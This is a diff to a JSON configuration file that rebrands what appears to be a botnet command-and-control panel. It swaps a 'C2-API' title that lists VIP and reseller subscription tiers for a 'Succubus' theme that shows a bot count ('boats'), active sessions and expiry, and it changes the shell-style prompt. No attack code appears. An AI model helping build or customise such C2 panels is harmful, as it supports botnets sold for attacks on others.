@@ -24,8 +24,8 @@
         "maximum": 1300
     },
     "branding": {
-        "title": "F C2-API | [<<$username>>] | Ongoing[<<$allgoing>>/<<$totalusers>>] Online[<<$onlineusers>>/<<$totalusers>>] Expiry[<<$expiry>>] VIP[<<$vip>>] SuperVIP[<<$reseller>>]",
-        "prompt": "<<$username>>@fuck-network:~# ",
+        "title":"<<$botcount>> boats | Succubus Custom Build | Serving <<$username>> | Active Sessions <<$onlineusers>> | <<$expiry>> ",
+	     "prompt":"<theme>┌──</>[<theme>Succubus</>]-[~/<theme>succubus</>/<theme>cnc</>/<theme><<$username>></>]\r\n<theme>└───</>➤",
         "assets": {
             "welcome": "succ",
             "banner": "succ",
